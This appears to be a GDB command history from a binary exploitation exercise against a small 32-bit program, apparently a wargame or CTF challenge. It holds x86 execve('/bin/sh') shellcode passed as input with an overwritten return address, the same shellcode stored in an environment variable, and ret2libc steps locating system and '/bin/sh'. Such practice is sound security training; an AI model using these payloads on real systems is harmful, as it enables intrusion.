c
c
c
x/50xw $esp
r <<< python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0')" <<< python -c "print('\x0b\xcd\x80' + 'B' * 10 + '\xff\xff\xff\xce\x86')"
n
r <<< $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0')") <<< $(python -c "print('\x0b\xcd\x80' + 'B' * 10 + '\xff\xff\xff\xce\x86')")
n
c
n
n
n
c
c
x/50xw $esp
r
c
quit
info functions 
disas p
disas pp
disas main
disas puts
r
x/50xw $esp
b *0x080485c5
r
x/50xw $esp
r
x/50xw $esp
set env '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
set env EXPLOIT='\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
set env EXPLOIT=\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
env
show env
x/s *((char **) environ+7)
x/s *((char **) environ)
x/s *((char **) environ+1)
x/s *((char **) environ+15)
x/s *((char **) environ+25)
x/s *((char **) environ+35)
x/s *((char **) environ+50)
x/s *((char **) environ+45)
x/s *((char **) environ+60)
x/s *((char **) environ+64)
x/s *((char **) environ+65)
x/s *((char **) environ+66)
x/s *((char **) environ+68)
x/s *((char **) environ+69)
x/s *((char **) environ+70)
x/a *((char **) environ+70)
x/a *((char **) environ+69)
x/a *((char **) environ+71)
x/a *((char **) environ+72)
x/a *((char **) environ+69)
x/a *((char **) environ+68)
x/a *((char **) environ+67)
unset env '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
show env
x/a *((char **) environ+67)
x/a *((char **) environ+66)
x/a *((char **) environ+65)
x/s *((char **) environ+65)
x/s *((char **) environ+67)
x/s *((char **) environ+68)
x/s *((char **) environ+69)
x/s environ
x/s *((char **) environ)
x/s *((char **) environ+65)
x/s *((char **) environ+67)
x/s *((char **) environ+68)
x/s *((char **) environ+80)
x/s *((char **) environ+75)
x/s *((char **) environ+76)
x/s *((char **) environ+77)
x/s *((char **) environ+78)
x/s *((char **) environ+79)
x/s *((char **) environ+82)
x/s *((char **) environ+80)
x/s *((char **) environ+81)
x/s *((char **) environ+70)
x/s *((char **) environ+69)
x/s *((char **) environ+68)
x/s *((char **) environ+67)
disas main
disas pp
disas p
r <<< $(cat test)
r <<< $(cat exploit)
x/50xw $esp
disas pp
disas main
b *0x080485c5
r <<< $(cat exploit)
x/50xw $esp
r <<< $(cat exploit)
x/50xw $esp
r <<< $(cat exploit)
x/50xw $esp
n
n
n
n
n
n
n
n
n
nn
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
r <<< $(cat exploit)
n
n
n
c
r <<< $(cat exploit)
x/30xw $esp
n
n
n
n
n
n
n
n
r <<< $(cat exploit)
x/30xw $esp
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n
n

n
n
x/30xw $esp
x/30xw $esp - 30
x/30xw $esp - 31
x/30xw $esp - 28
r <<< $(cat exploit)
x/30xw $esp - 28
x/30xw $esp
r <<< $(cat exploit)
x/30xw $esp
n
n
n
n
nn
n
n
n
n
n
n
n
n
n
quit
disas p
b *0x080484e6
r <<< $(cat exploit)
x/2xw $esp
x/s 0xffffbe00
x/s 0xffffbe00 + 4095
x/a 0xffffbe00 + 4095
x/xw 0xffffbe00 + 4095
x/xw 0xffffbe00 + 4094
x/xw 0xffffbe00 + 4093
r <<< $(cat exploit)
x/xw 0xffffbe00 + 4094
x/xw 0xffffbe00 + 4091
x/xw 0xffffbe00
x/s 0xffffbe00 + 20
info f
info funcc
info func
quit
info func
quit
info func
quit
disas main
b *0x080485c5
r
x/30wx $esp
r <<< $(cat exploit2)
n
n
n
n
n
n
n
n
n
n
n
n
n
find __libc_start_main,+99999999,"/bin/sh"
info func
quit
info func
find __libc_start_main,+99999999,"/bin/sh"
p system
run
disas main
b *0x080485c5
r
x/30xw $esp
info reg
r
x/30xw $esp
r
x/30xw $esp
n
n
n
quit
